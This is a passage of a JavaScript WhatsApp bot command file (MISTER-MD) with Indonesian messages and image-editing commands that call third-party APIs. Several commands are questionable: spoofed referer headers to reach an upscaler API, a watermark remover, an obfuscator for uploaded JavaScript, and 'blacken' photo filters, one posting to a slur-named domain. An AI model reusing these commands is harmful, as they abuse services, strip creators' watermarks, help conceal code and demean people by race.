✅ Foto berhasil ditingkatkan kualitasnya.`
        },
        {
          quoted: m
        }
      )

    } catch (e) {
      console.log('UPSCALE ERROR:', e)

      let errorMessage =
        e.response?.data?.message ||
        e.response?.data?.msg ||
        e.message ||
        'Terjadi kesalahan tidak diketahui.'

      if (
        e.code === 'ECONNABORTED' ||
        e.code === 'ETIMEDOUT'
      ) {
        errorMessage =
          'Request API timeout. Silakan coba lagi.'
      }

      if (e.response?.status === 404) {
        errorMessage =
          'Endpoint Upscale tidak ditemukan.'
      }

      if (e.response?.status === 429) {
        errorMessage =
          'Terlalu banyak request. Silakan tunggu beberapa saat.'
      }

      return xreply(
        `❌ *UPSCALE ERROR*

${errorMessage}`
      )
    }
  }
  break

  case 'remini':
  case 'hd2': {
    const availableScaleRatio = [2, 4];

    const imgupscale = {
      req: async (imagePath, scaleRatio) => {
        const FormData = require('form-data');
        const fs = require('fs');
        const axios = require('axios');
        const form = new FormData();
        form.append('myfile', fs.createReadStream(imagePath));
        form.append('scaleRadio', scaleRatio.toString());

        const response = await axios.request({
          method: 'POST',
          url: 'https://get1.imglarger.com/api/UpscalerNew/UploadNew',
          headers: {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/5.37.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/5.37.36',
            'Accept': 'application/json, text/plain, */*',
            'origin': 'https://imgupscaler.com',
            'referer': 'https://imgupscaler.com/',
            ...form.getHeaders()
          },
          data: form
        });
        return response.data;
      },

      cek: async (code, scaleRatio) => {
        const axios = require('axios');
        const response = await axios.request({
          method: 'POST',
          url: 'https://get1.imglarger.com/api/UpscalerNew/CheckStatusNew',
          headers: {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/5.37.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/5.37.36',
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'origin': 'https://imgupscaler.com',
            'referer': 'https://imgupscaler.com/'
          },
          data: JSON.stringify({ code, scaleRadio: scaleRatio })
        });
        return response.data;
      },

      upscale: async (imagePath, scaleRatio, maxRetries = 30, retryDelay = 2000) => {
        const uploadResult = await imgupscale.req(imagePath, scaleRatio);
        if (uploadResult.code !== 200) {
          throw new Error(`Upload failed: ${uploadResult.msg}`);
        }

        const { code } = uploadResult.data;
        for (let i = 0; i < maxRetries; i++) {
          const statusResult = await imgupscale.cek(code, scaleRatio);

          if (statusResult.code === 200 && statusResult.data.status === 'success') {
            return {
              success: true,
              downloadUrls: statusResult.data.downloadUrls
            };
          }

          if (statusResult.data.status === 'error') {
            throw new Error('Processing failed on server');
          }
          await new Promise(resolve => setTimeout(resolve, retryDelay));
        }
        throw new Error('Processing timeout - maximum retries exceeded');
      }
    };

    if (!m.quoted || !/image/.test(m.quoted.mimetype || '')) {
      return xreply('Reply gambar dengan perintah .hd 2x atau .hd 4x');
    }

    const scale = args[0]?.replace(/x/i, '') || '2';
    if (!availableScaleRatio.includes(Number(scale))) {
      return xreply('Pilih resolusi: 2x atau 4x');
    }

    let tmpPath;
    try {
      await xreply('⏳ Sedang memproses gambar, mohon tunggu...');

      const buffer = await client.downloadMediaMessage(m.quoted);
      const tmpDir = './tmp';
      const fs = require('fs');
      if (!fs.existsSync(tmpDir)) {
        fs.mkdirSync(tmpDir, { recursive: true });
      }

      const { default: path } = await import('path');
      tmpPath = path.join(tmpDir, `sanhua_hd_${Date.now()}.jpg`);
      fs.writeFileSync(tmpPath, buffer);

      const result = await imgupscale.upscale(tmpPath, Number(scale));

      if (!result.success || !result.downloadUrls?.length) {
        throw new Error('Gagal melakukan upscale gambar.');
      }

      await client.sendMessage(m.chat, {
        image: { url: result.downloadUrls[0] },
        caption: `✅ Gambar berhasil ditingkatkan menjadi ${scale}x`
      }, { quoted: m });

    } catch (e) {
      xreply(`Terjadi error: ${e.message}`);
    } finally {
      const fs = require('fs');
      if (tmpPath && fs.existsSync(tmpPath)) {
        fs.unlinkSync(tmpPath);
      }
    }
  }
  break

  /// ───────────── [ 𝖥𝖺𝗄𝖾 𝖬𝖺𝗄𝖾𝗋 ] ──────────── ///
  case 'fakeffduo': {
    try {
      const axios = require('axios')

      if (!text) {
        return xreply(`❌ *NICKNAME TIDAK BOLEH KOSONG*

Format:
.fakeffduo nickname1|nickname2`)
      }

      const args = text.split('|')

      if (args.length < 2) {
        return xreply(`❌ *FORMAT SALAH*

Gunakan:
.fakeffduo nickname1|nickname2
`)
      }

      const nickname1 = args[0].trim()
      const nickname2 = args.slice(1).join('|').trim()

      if (!nickname1 || !nickname2) {
        return xreply('❌ Kedua nickname wajib diisi.')
      }

      if (nickname1.length > 30 || nickname2.length > 30) {
        return xreply('❌ Maksimal 30 karakter untuk setiap nickname.')
      }

      await xreply('⏳ Sedang membuat Fake FF Duo...')

      const apiUrl =
        `https://apii.nexadev.my.id/fakeffduo?nickname1=${encodeURIComponent(nickname1)}&nickname2=${encodeURIComponent(nickname2)}`

      const response = await axios.get(apiUrl, {
        responseType: 'arraybuffer',
        timeout: 60000,
        headers: {
          'User-Agent': 'Mozilla/5.0',
          'Accept': 'image/*'
        },
        maxContentLength: 15 * 1024 * 1024,
        maxBodyLength: 15 * 1024 * 1024
      })

      if (!response.data || response.data.length === 0) {
        return xreply('❌ API tidak mengembalikan gambar.')
      }

      const contentType =
        response.headers['content-type'] || ''

      if (!contentType.startsWith('image/')) {
        let errorText

        try {
          errorText = Buffer
            .from(response.data)
            .toString('utf8')
        } catch {
          errorText = 'Response API bukan gambar.'
        }

        return xreply(
          `❌ *GAGAL MEMBUAT FAKE FF DUO*

${errorText.substring(0, 1000)}`
        )
      }

      await client.sendMessage(
        m.chat,
        {
          image: Buffer.from(response.data),
          caption: `🎮 *FAKE FREE FIRE DUO*`
        },
        {
          quoted: m
        }
      )

    } catch (e) {
      console.log('FAKEFFDUO ERROR:', e)

      let errorMessage =
        e.response?.data?.message ||
        e.response?.data?.msg ||
        e.message ||
        'Terjadi kesalahan tidak diketahui.'

      if (
        e.code === 'ECONNABORTED' ||
        e.code === 'ETIMEDOUT'
      ) {
        errorMessage =
          'Request API timeout. Silakan coba lagi.'
      }

      if (e.response?.status === 404) {
        errorMessage =
          'Endpoint Fake FF Duo tidak ditemukan (404).'
      }

      if (e.response?.status === 429) {
        errorMessage =
          'Terlalu banyak request. Tunggu beberapa saat.'
      }

      return xreply(
        `❌ *FAKE FF DUO ERROR*

${errorMessage}`
      )
    }
  }
  break

  case 'fakeff': {
    try {
      const axios = require('axios')

      if (!text) {
        return xreply(
          `❌ *NAMA TIDAK BOLEH KOSONG*

Contoh :
.fakeff MISTER-MD`
        )
      }

      const username = text.trim()

      if (username.length > 30) {
        return xreply('❌ Nama terlalu panjang! Maksimal 30 karakter.')
      }

      await xreply('⏳ Sedang membuat Fake FF...')

      const apiUrl = `https://apii.nexadev.my.id/fakeff?usn=${encodeURIComponent(username)}`

      const response = await axios.get(apiUrl, {
        responseType: 'arraybuffer',
        timeout: 60000,
        headers: {
          'User-Agent': 'Mozilla/5.0',
          'Accept': 'image/*'
        },
        maxContentLength: 15 * 1024 * 1024,
        maxBodyLength: 15 * 1024 * 1024
      })

      if (!response.data || response.data.length === 0) {
        return xreply('❌ API tidak mengembalikan gambar.')
      }

      const contentType = response.headers['content-type'] || ''

      if (!contentType.startsWith('image/')) {
        let errorText

        try {
          errorText = Buffer.from(response.data).toString('utf8')
        } catch {
          errorText = 'Response API bukan gambar.'
        }

        return xreply(
          `❌ *GAGAL MEMBUAT FAKE FF*

${errorText.substring(0, 1000)}`
        )
      }

      await client.sendMessage(
        m.chat,
        {
          image: Buffer.from(response.data),
          caption: `
🎮 *FAKE FREE FIRE*

👤 Username:
${username}

✅ Fake FF berhasil dibuat.
`
        },
        {
          quoted: m
        }
      )

    } catch (e) {
      console.log('FAKEFF ERROR:', e)

      let errorMessage =
        e.response?.data?.message ||
        e.response?.data?.msg ||
        e.message ||
        'Terjadi kesalahan tidak diketahui.'

      if (
        e.code === 'ECONNABORTED' ||
        e.code === 'ETIMEDOUT'
      ) {
        errorMessage = 'Request API timeout. Silakan coba lagi.'
      }

      if (e.response?.status === 404) {
        errorMessage = 'Endpoint Fake FF tidak ditemukan (404).'
      }

      if (e.response?.status === 429) {
        errorMessage = 'Terlalu banyak request. Tunggu beberapa saat.'
      }

      return xreply(
        `❌ *FAKE FF ERROR*

${errorMessage}`
      )
    }
  }
  break

  /// ───────────── [ 𝖲𝖼𝗋𝗂𝗉𝗍 & 𝖮𝖻𝖿𝗎𝗌𝖼𝖺𝗍𝗈𝗋 ] ──────────── ///
  case "sc":
  case "getsc":
  case "script": {
    const foto = fs.readFileSync("./media/thum.jpg")
    const sc = ""
    const anu = `
halo *${m.pushName}*, jika kamu menginginkan script MISTER-MD ini silahkan baca aturan di bawah ini.

\`PERINGATAN KERAS\`
- dilarang keras menghapus credits
- dilarang memperjual belikan script ini karena 100% free dan script ini open source
- dilarang mengklaim/memiliki script ini 100%
- dilarang menghapus, mengganti, menyembunyikan, atau mengklaim credits
- jika kamu melakukan recode, modifikasi, atau redistribusi source, *credits asli WAJIB tetap dicantumkan*.
- open source bukan berarti bebas menghapus credits. Hormati pembuat dan contributor yang sudah mengembangkan source ini
`.trim()
    try {
      const media = await prepareWAMessageMedia(
        { image: foto },
        { upload: client.waUploadToServer }
      );
      const interactiveMsg = {
        body: { text: sc },
        footer: { text: anu },
        header: {
          hasMediaAttachment: true,
          imageMessage: media.imageMessage
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "cta_url",
              buttonParamsJson: JSON.stringify({
                display_text: "𝖦𝖾𝗍 𝖲𝖼𝗋𝗂𝗉𝗍",
                url: "https://www.youtube.com/@FyzzX7",
                merchant_url: "https://www.google.com"
              })
            }
          ],
          messageParamsJson: "{}"
        }
      };

      const generatedMsg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: interactiveMsg
          }
        }
      }, { userJid: m.chat, upload: client.waUploadToServer });

      return await client.relayMessage(m.chat, generatedMsg.message, {
        messageId: generatedMsg.key.id
      });
    } catch (e) {
      console.log(e);
      reply(`❌ Gagal kirim pesan: ${e.message}`);
    }
  }
  break

  case 'enc': {
    if (!isOwner) return reply('❌ Fitur khusus user premium');
    if (!m.quoted) return xreply("\n❌ ғᴏʀᴍᴀᴛ ʜᴀʀᴜs ғɪʟᴇ.ᴊs\n")
    if (!text || !text.includes('|'))
      return reply('\n❌ Contoh:\n.enc text1|text2\n.enc MISTER-MD|MISTER-MD-enc\n')
    try {
      Reply('⚡ Processing hard code encryption...');

      const fs = require('fs');
      const path = require('path');
      const axios = require('axios');
      const JsConfuser = require('js-confuser');
      let [text1, text2] = text.split('|')

      let media = await m.quoted.download();
      if (!media) return reply('❌ Gagal mengunduh file');
      const fileName =
        m.quoted?.message?.documentMessage?.fileName ||
        m.quoted?.message?.imageMessage?.fileName ||
        m.quoted?.message?.videoMessage?.fileName ||
        null
      let codeString = media.toString('utf-8');
      if (typeof codeString !== 'string')
        throw new Error('File bukan string JavaScript');

      let obfuscated = await JsConfuser.obfuscate(codeString, {
        target: "node",
        compact: true,
        controlFlowFlattening: 0.8,
        deadCode: 0.3,
        dispatcher: true,
        duplicateLiteralsRemoval: 0.7,
        globalConcealing: true,
        minify: true,
        movedDeclarations: true,
        objectExtraction: true,
        renameVariables: true,
        renameGlobals: true,
        stringEncoding: true,
        stringSplitting: 0.5,
        stringConcealing: true,
        stringCompression: true,
        opaquePredicates: 0.9,
        calculator: true,
        hexadecimalNumbers: true,
        shuffle: true,
        identifierGenerator: () =>
          `高宝座${text1}齐${text2}高宝座` +
          Math.random().toString(36).substring(7),
      });

      let result = typeof obfuscated === 'object'
        ? obfuscated.code
        : obfuscated;

      if (typeof result !== 'string')
        throw new Error('Hasil enkripsi tidak valid');

      let outFile = path.join(
        __dirname,
        `encrypted_${m.quoted.fileName}`
      );

      fs.writeFileSync(outFile, result);

      await client.sendMessage(
        m.chat,
        {
          document: fs.readFileSync(outFile),
          fileName: `${fileName}_${m.pushName}.js`,
          mimetype: 'application/javascript',
          caption: '✅ Encryption Successful\n• Type: Hard Code'
        },
        { quoted: m }
      );

      fs.unlinkSync(outFile);
    } catch (e) {
      console.error(e);
      Reply('❌ Error: ' + e.message);
    }
  }
  break

  /// ───────────── [ 𝖣𝖾𝗐𝖺𝗍𝖾𝗋𝗆𝖺𝗋𝗄 & 𝖨𝗆𝖺𝗀𝖾 𝖬𝖺𝗇𝗂𝗉𝗎𝗅𝖺𝗌𝗂 ] ──────────── ///
  case "delwatermark": {
    if (!m.quoted) {
      return xreply(
        "❌ Reply foto yang ingin diproses."
      )
    }

    const mime =
      (m.quoted.msg || m.quoted).mimetype || ""

    if (!/^image\//i.test(mime)) {
      return xreply(
        "❌ Reply foto, bukan video atau dokumen."
      )
    }

    let media = null

    try {
      const fs = require("fs")
      const axios = require("axios")
      const { ImageUploadService } = require("node-upload-images")

      await xreply(
        "⏳ *DEWATERMARK*\n\n" +
        "📥 Mengambil foto..."
      )

      media =
        await client.downloadAndSaveMediaMessage(
          m.quoted
        )

      if (
        !media ||
        !fs.existsSync(media)
      ) {
        throw new Error(
          "Gagal mendownload foto."
        )
      }

      await xreply(
        "🌐 Upload foto ke Pixhost..."
      )

      const service =
        new ImageUploadService(
          "pixhost.to"
        )

      const upload =
        await service.uploadFromBinary(
          fs.readFileSync(media),
          "MISTER-MD-md.jpg"
        )

      if (
        !upload ||
        !upload.directLink
      ) {
        throw new Error(
          "Gagal mendapatkan direct link Pixhost."
        )
      }

      const imageUrl =
        upload.directLink.toString()

      console.log(
        "[DEWATERMARK URL]",
        imageUrl
      )

      try {
        fs.unlinkSync(media)
        media = null
      } catch { }

      await xreply(
        "🧹 Menghapus watermark...\n" +
        "⏳ Tunggu sebentar..."
      )

      const apiUrl =
        "https://api.nexray.eu.cc/tools/v1/dewatermark?url=" +
        encodeURIComponent(imageUrl)

      const response =
        await axios.get(
          apiUrl,
          {
            responseType: "arraybuffer",
            timeout: 180000,
            headers: {
              "User-Agent":
                "Mozilla/5.0"
            }
          }
        )

      const resultBuffer =
        Buffer.from(response.data)

      if (
        !resultBuffer ||
        resultBuffer.length < 100
      ) {
        throw new Error(
          "Hasil dari API kosong atau rusak."
        )
      }

      console.log(
        "[DEWATERMARK]",
        "Content-Type:",
        response.headers["content-type"]
      )

      console.log(
        "[DEWATERMARK]",
        "Size:",
        resultBuffer.length,
        "bytes"
      )

      const isPNG =
        resultBuffer
          .subarray(0, 8)
          .equals(
            Buffer.from([
              0x89,
              0x50,
              0x4E,
              0x47,
              0x0D,
              0x0A,
              0x1A,
              0x0A
            ])
          )

      if (!isPNG) {
        const textResponse =
          resultBuffer.toString(
            "utf8"
          )

        console.log(
          "[DEWATERMARK NON-PNG]",
          textResponse.slice(0, 2000)
        )

        throw new Error(
          "API tidak mengembalikan gambar PNG."
        )
      }

      await client.sendMessage(
        m.chat,
        {
          image: resultBuffer,
          mimetype: "image/png",
          caption:
            "✅ *DEWATERMARK BERHASIL*\n\n" +
            "🧹 Watermark sudah diproses."
        },
        {
          quoted: m
        }
      )

      console.log(
        "[DEWATERMARK] Berhasil mengirim hasil."
      )

    } catch (e) {
      console.error(
        "[DEWATERMARK ERROR]",
        e
      )

      return xreply(
        "❌ *DEWATERMARK GAGAL*\n\n" +
        "Error: " +
        (
          e?.response?.data
            ? Buffer.isBuffer(e.response.data)
              ? e.response.data
                .toString("utf8")
                .slice(0, 500)
              : JSON.stringify(
                e.response.data
              ).slice(0, 500)
            : e?.message || e
        )
      )

    } finally {
      if (
        media &&
        fs.existsSync(media)
      ) {
        try {
          fs.unlinkSync(media)
        } catch { }
      }
    }
  }
  break

  case 'removebg':
  case 'rvbg':
  case 'rmbg':
  case 'removebackground': {
    try {
      if (!/image/.test(mime)) {
        return xreply(example("dengan kirim/reply foto"))
      }

      Reply("⏳ Mengupload gambar ke Pixhost...")

      const { ImageUploadService } = require("node-upload-images")
      const fs = require("fs")
      const axios = require("axios")

      let media = await client.downloadAndSaveMediaMessage(qmsg)

      const service = new ImageUploadService("pixhost.to")

      const { directLink } = await service.uploadFromBinary(
        fs.readFileSync(media),
        `removebg_${Date.now()}.jpg`
      )

      fs.unlinkSync(media)

      if (!directLink) {
        return xreply("❌ Gagal upload gambar ke Pixhost.")
      }

      Reply("⏳ Sedang menghapus background...")

      const api = `https://api.nexray.eu.cc/tools/removebg?url=${encodeURIComponent(directLink)}`

      const { data } = await axios.get(api, {
        responseType: "arraybuffer",
        timeout: 120000,
        headers: {
          Accept: "image/*"
        }
      })

      await client.sendMessage(
        m.chat,
        {
          image: Buffer.from(data),
          caption: `乂 *REMOVE BACKGROUND SUCCESS*
> Background berhasil dihapus.`
        },
        {
          quoted: m
        }
      )

    } catch (e) {
      console.log(e)

      if (e.response) {
        console.log("Status:", e.response.status)
        console.log("Data:", e.response.data?.toString?.())
      }

      xreply(`❌ Gagal menghapus background!\n\n${e.message}`)
    }
  }
  break

  case 'blurface': {
    try {
      if (!/image/.test(mime)) {
        return xreply(example("dengan kirim/reply foto"))
      }

      Reply("⏳ Mengupload gambar ke Pixhost...")

      const { ImageUploadService } = require("node-upload-images")
      const fs = require("fs")

      let media = await client.downloadAndSaveMediaMessage(qmsg)

      const service = new ImageUploadService("pixhost.to")

      const { directLink } = await service.uploadFromBinary(
        fs.readFileSync(media),
        `blurface_${Date.now()}.jpg`
      )

      fs.unlinkSync(media)

      if (!directLink) {
        return xreply("❌ Gagal upload ke Pixhost.")
      }

      Reply("⏳ Sedang memproses Blur Face...")

      const api = `https://api.nexray.eu.cc/tools/blurface?url=${encodeURIComponent(directLink)}`

      await client.sendMessage(
        m.chat,
        {
          image: {
            url: api
          },
          caption: `
乂 *BLUR FACE SUCCESS*
> Berhasil membuat efek Blur Face.`
        },
        {
          quoted: m
        }
      )

    } catch (e) {
      console.log(e)
      xreply(`❌ Gagal membuat Blur Face!\n\n${e.message}`)
    }
  }
  break

  case "hitamin": {
    if (!/image/.test(mime)) return xreply("Reply gambar yang mau dihitamin dengan caption *hitamin*");
    const mediaPath = await client.downloadAndSaveMediaMessage(qmsg);
    const buffer = fs.readFileSync(mediaPath);
    const base64Image = buffer.toString("base64");
    try {
      const axios = require('axios');
      const response = await axios({
        url: "https://negro.consulting/api/process-image",
        method: "POST",
        data: {
          filter: "hitam",
          imageData: "data:image/png;base64," + base64Image
        }
      });

      const resultBuffer = Buffer.from(response.data.processedImageUrl.replace("data:image/png;base64,", ""), "base64");
      await client.sendMessage(m.chat, { image: resultBuffer, caption: `Selesai, pake filter *hitam*` }, { quoted: m });

      fs.unlinkSync(mediaPath);
    } catch (err) {
      console.log(err);
      xreply("Gagal memproses gambar.");
    }
  }
  break

  case "hd":
  case "enhance": {
    try {
      if (!/image/.test(mime)) {
        return xreply(
          `⚠️ *Format Penggunaan :*

💬 Contoh :
Reply/Kirim gambar dengan caption
${prefix + command}`
        );
      }

      await client.sendMessage(m.chat, {
        react: { text: "🖼️", key: m.key }
      });

      const quoted = m.quoted ? m.quoted : m;

      const buffer = await quoted.download();

      const FormData = require("form-data");
      const axios = require("axios");

      const form = new FormData();

      form.append("method", "1");
      form.append("is_pro_version", "false");
      form.append("is_enhancing_more", "false");
      form.append("max_image_size", "high");

      form.append("file", buffer, {
        filename: "image.jpg",
        contentType: "image/jpeg"
      });

      const response = await axios.post(
        "https://ihancer.com/api/enhance",
        form,
        {
          headers: form.getHeaders(),
          responseType: "arraybuffer"
        }
      );

      const result = Buffer.from(response.data);

      await client.sendMessage(
        m.chat,
        {
          image: result,
          caption:
            `*HD Image Success* ✅

🖼️ Gambar berhasil di enhance menjadi HD
> *Powered By MISTER-MD*`
        },
        { quoted: m }
      );

      await client.sendMessage(m.chat, {
        react: { text: "✅", key: m.key }
      });

    } catch (err) {
      console.error("HD Error:", err?.response?.data || err.message);

      await client.sendMessage(
        m.chat,
        {
          text:
            `⚠️ Maaf , terjadi kesalahan saat meng-HD-kan gambar.

💡 Detail Error :
${err?.response?.data?.message || err.message}`
        },
        { quoted: m }
      );

      await client.sendMessage(m.chat, {
        react: { text: "❌", key: m.key }
      });
    }
  }
  break

  case "tohitam": {
    try {
      const fs = require("fs")
      const axios = require("axios")
      const { ImageUploadService } = require("node-upload-images")

      if (!/image/.test(mime))
        return xreply(`Reply foto dengan caption *${prefix + command}*`)

      await xreply("⏳ Mengupload gambar...")

      let media = await client.downloadAndSaveMediaMessage(qmsg)

      const service = new ImageUploadService("pixhost.to")
      let { directLink } = await service.uploadFromBinary(
        fs.readFileSync(media),
        "MISTER-MD-md.jpg"
      )

      fs.unlinkSync(media)

      await xreply("🎨 Sedang mengubah gambar...")

      const response = await axios({
        method: "GET",
        url: `https://api.nexray.eu.cc/ephoto/hitam?url=${encodeURIComponent(directLink)}`,
        responseType: "arraybuffer",
        validateStatus: () => true
      })

      const type = response.headers["content-type"] || ""

      if (type.startsWith("image/")) {
        return await client.sendMessage(
          m.chat,
          {
            image: Buffer.from(response.data),
            caption: "✅ Berhasil mengubah gambar menjadi hitam."
          },
          { quoted: m }
        )
      }

      const json = JSON.parse(Buffer.from(response.data).toString())

      if (!json.status) {
        return xreply(`❌ ${json.error || "Gagal memproses gambar."}`)
      }

      let result =
        json.result ||
        json.result_url ||
        json.url ||
        json.image ||
        json.data?.url

      if (!result) {
        return xreply("❌ URL hasil tidak ditemukan.")
      }

      await client.sendMessage(
        m.chat,
        {
          image: { url: result },
          caption: "✅ Berhasil mengubah gambar menjadi hitam."
        },
        { quoted: m }
      )

    } catch (e) {
      console.log(e)
      xreply(`❌ Error\n${e.message}`)
    }
  }
  break

  /// ───────────── [ 𝖤𝖿𝖾𝗄 𝖨𝗆𝖺𝗀𝖾 & 𝖲𝗍𝗂𝖼𝗄𝖾𝗋 ] ──────────── ///
  case "tocomic": {
    try {
      if (!/image/.test(mime))
        return xreply("Reply foto dengan command *.tocomic*")

      await xreply("⏳ Sedang mengubah gambar menjadi Comic...")

      const axios = require("axios")
      const FormData = require("form-data")
      const fs = require("fs")

      let media = await client.downloadAndSaveMediaMessage(qmsg)

      let form = new FormData()
      form.append("file", fs.createReadStream(media))

      let { data } = await axios.post(
        "https://api-nexaku.my.id/transform/comic",
        form,
        {
          headers: {
            ...form.getHeaders()
          },
          responseType: "arraybuffer",
          maxBodyLength: Infinity,
          maxContentLength: Infinity
        }
      )

      if (fs.existsSync(media)) fs.unlinkSync(media)

      await client.sendMessage(
        m.chat,
        {
          image: Buffer.from(data),
          caption: `📖 *Comic AI*

✅ Gambar berhasil diubah menjadi style Comic.`
        },
        { quoted: m }
      )

    } catch (e) {
      if (typeof media !== "undefined" && fs.existsSync(media))
        fs.unlinkSync(media)

      console.log(e.response?.data || e)

      xreply(`❌ Gagal memproses gambar

${e.response?.status || ""}
${e.message}`)
    }
  }
  break

  case "tochibi": {
    try {
      const fs = require("fs")
      const axios = require("axios")
      const { ImageUploadService } = require("node-upload-images")

      if (!/image/.test(mime))
        return xreply(`Reply foto dengan caption *${prefix + command}*`)

      await xreply("⏳ Mengupload gambar...")

      let media = await client.downloadAndSaveMediaMessage(qmsg)

      const service = new ImageUploadService("pixhost.to")
      let { directLink } = await service.uploadFromBinary(
        fs.readFileSync(media),
        "MISTER-MD-md.jpg"
      )

      fs.unlinkSync(media)

      await xreply("🎨 Sedang membuat gambar Chibi...")

      const response = await axios({
        method: "GET",
        url: `https://api.nexray.eu.cc/ephoto/chibi?url=${encodeURIComponent(directLink)}`,
        responseType: "arraybuffer",
        validateStatus: () => true
      })

      const type = response.headers["content-type"] || ""

      if (type.startsWith("image/")) {
        return await client.sendMessage(
          m.chat,
          {
            image: Buffer.from(response.data),
            caption: "✅ Berhasil mengubah gambar menjadi Chibi."
          },
          { quoted: m }
        )
      }

      let json = {}
      try {
        json = JSON.parse(Buffer.from(response.data).toString())
      } catch { }

      if (!json.status) {
        return xreply(`❌ ${json.error || "Gagal memproses gambar."}`)
      }

      let hasil =
        json.result ||
        json.result_url ||
        json.url ||
        json.image ||
        json.output ||
        json.data?.url ||
        json.data?.result

      if (!hasil) {
        return xreply("❌ URL hasil tidak ditemukan.")
      }

      await client.sendMessage(
        m.chat,
        {
          image: { url: hasil },
          caption: "✅ Berhasil mengubah gambar menjadi Chibi."
        },
        { quoted: m }
      )

    } catch (e) {
      console.log(e.response?.data || e)
      xreply(`❌ Error\n${e.message}`)
    }
  }
  break

  case "toghibli": {
    try {
      if (!/image/.test(mime)) {
        return reply(`Contoh:\n${prefix + command} reply foto`);
      }

      Reply("⏳ Upload gambar ke PixHost...");

      const fs = require("fs");
      const axios = require("axios");
      const { ImageUploadService } = require("node-upload-images");

      let media = await client.downloadAndSaveMediaMessage(qmsg);

      const service = new ImageUploadService("pixhost.to");
      let { directLink } = await service.uploadFromBinary(
        fs.readFileSync(media),
        "MISTER-MD-md.jpg"
      );

      fs.unlinkSync(media);

      Reply("🎨 Sedang membuat gambar Ghibli...");

      const api = `https://api.nexray.eu.cc/ephoto/ghibli?url=${encodeURIComponent(directLink)}`;

      const { data } = await axios.get(api, {
        responseType: "arraybuffer"
      });

      await client.sendMessage(
        m.chat,
        {
          image: Buffer.from(data),
          caption: `*🌸 TO GHIBLI SUCCESS*\n\n🔗 Source : ${directLink}`
        },
        { quoted: m }
      );

    } catch (e) {
      console.log(e);
      Reply("❌ Gagal membuat gambar Ghibli.\n\n" + e.message);
    }
  }
  break

  case "cine": {
    try {
      const fs = require("fs")
      const axios = require("axios")
      const { ImageUploadService } = require("node-upload-images")

      if (!/image/.test(mime))
        return xreply(`Reply foto dengan caption *${prefix + command}*`)

      await xreply("⏳ Mengupload gambar ke Pixhost...")

      let media = await client.downloadAndSaveMediaMessage(qmsg)

      const service = new ImageUploadService("pixhost.to")
      let { directLink } = await service.uploadFromBinary(
        fs.readFileSync(media),
        "MISTER-MD-md.jpg"
      )

      fs.unlinkSync(media)

      await xreply("🎬 Sedang membuat efek Cinematic...")

      const response = await axios({
        method: "GET",
        url: `https://api.nexray.eu.cc/ephoto/cinematic?url=${encodeURIComponent(directLink)}`,
        responseType: "arraybuffer",
        validateStatus: () => true
      })

      const contentType = response.headers["content-type"] || ""

      if (contentType.startsWith("image/")) {
        return await client.sendMessage(
          m.chat,
          {
            image: Buffer.from(response.data),
            caption: "✅ Berhasil membuat efek Cinematic."
          },
          { quoted: m }
        )
      }

      let json = {}
      try {
        json = JSON.parse(Buffer.from(response.data).toString())
      } catch { }

      if (!json.status) {
        return xreply(`❌ ${json.error || json.message || "Gagal memproses gambar."}`)
      }

      let hasil =
        json.result ||
        json.result_url ||
        json.url ||
        json.image ||
        json.output ||
        json.data?.url ||
        json.data?.result

      if (!hasil) {
        return xreply("❌ URL hasil tidak ditemukan.")
      }

      await client.sendMessage(
        m.chat,
        {
          image: { url: hasil },
          caption: "✅ Berhasil membuat efek Cinematic."
        },
        { quoted: m }
      )

    } catch (e) {
      console.log(e.response?.data || e)
      xreply(`❌ Error\n${e.response?.data?.error || e.response?.data?.message || e.message}`)
    }
  }
  break

  /// ───────────── [ 𝖥𝗂𝗀𝗎𝗋𝖾 𝖬𝖺𝗄𝖾𝗋 ] ──────────── ///
  case "figure2": {
    try {
      const fs = require("fs")
      const axios = require("axios")
      const { ImageUploadService } = require("node-upload-images")

      if (!/image/.test(mime))
        return xreply(`Reply foto dengan caption *${prefix + command}*`)

      await xreply("⏳ Mengupload gambar...")

      let media = await client.downloadAndSaveMediaMessage(qmsg)

      const service = new ImageUploadService("pixhost.to")
      let { directLink } = await service.uploadFromBinary(
        fs.readFileSync(media),
        "MISTER-MD-md.jpg"
      )

      fs.unlinkSync(media)

      await xreply("🎨 Sedang membuat Figure V2...")

      const response = await axios({
        method: "GET",
        url: `https://api.nexray.eu.cc/ephoto/v2/figure?url=${encodeURIComponent(directLink)}`,
        responseType: "arraybuffer",
        validateStatus: () => true
      })

      const contentType = response.headers["content-type"] || ""

      if (contentType.startsWith("image/")) {
        return await client.sendMessage(
          m.chat,
          {
            image: Buffer.from(response.data),
            caption: "✅ Berhasil membuat Figure V2."
          },
          { quoted: m }
        )
      }

      let json = {}
      try {
        json = JSON.parse(Buffer.from(response.data).toString())
      } catch { }

      if (!json.status) {
        return xreply(`❌ ${json.error || "Gagal memproses gambar."}`)
      }

      let hasil =
        json.result ||
        json.result_url ||
        json.url ||
        json.image ||
        json.output ||
        json.data?.url ||
        json.data?.result

      if (!hasil) {
        return xreply("❌ URL hasil tidak ditemukan.")
      }

      await client.sendMessage(
        m.chat,
        {
          image: { url: hasil },
          caption: "✅ Berhasil membuat Figure V2."
        },
        { quoted: m }
      )

    } catch (e) {
      console.log(e.response?.data || e)
      xreply(`❌ Error\n${e.message}`)
    }
  }
  break

  case "figure": {
    try {
      const fs = require("fs")
      const axios = require("axios")
      const { ImageUploadService } = require("node-upload-images")

      if (!/image/.test(mime))
        return xreply(`Reply foto dengan caption *${prefix + command}*`)

      await xreply("⏳ Mengupload gambar...")

      let media = await client.downloadAndSaveMediaMessage(qmsg)

      const service = new ImageUploadService("pixhost.to")
      let { directLink } = await service.uploadFromBinary(
        fs.readFileSync(media),
        "MISTER-MD-md.jpg"
      )

      fs.unlinkSync(media)

      await xreply("🎨 Sedang membuat Figure...")

      const response = await axios({
        method: "GET",
        url: `https://api.nexray.eu.cc/ephoto/v1/figure?url=${encodeURIComponent(directLink)}`,
        responseType: "arraybuffer",
        validateStatus: () => true
      })

      const contentType = response.headers["content-type"] || ""

      if (contentType.startsWith("image/")) {
        return await client.sendMessage(
          m.chat,
          {
